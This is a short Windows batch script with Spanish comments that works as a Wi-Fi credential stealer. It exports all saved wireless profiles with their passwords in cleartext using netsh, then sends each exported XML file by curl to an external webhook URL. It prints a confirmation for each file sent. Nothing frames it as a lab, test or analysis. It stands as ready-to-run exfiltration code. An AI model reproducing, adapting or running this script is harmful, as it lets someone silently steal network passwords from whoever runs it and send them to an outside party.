@echo off
REM Crea la carpeta (aunque ya exista, no para la ejecución)
if not exist "%~dp0" mkdir "%~dp0"

REM Exporta todos los perfiles Wi-Fi con contraseña en claro
netsh wlan export profile folder="%~dp0" key=clear

REM Envía cada XML al webhook
for %%F in ("%~dp0*.xml") do (
  curl.exe -H "Content-Type: application/xml" --data-binary @%%F ^
    https://webhook-test.com/dac752f76cec8c9fa7e9cff1baac3d64
  echo Enviado %%~nxF
)

pause
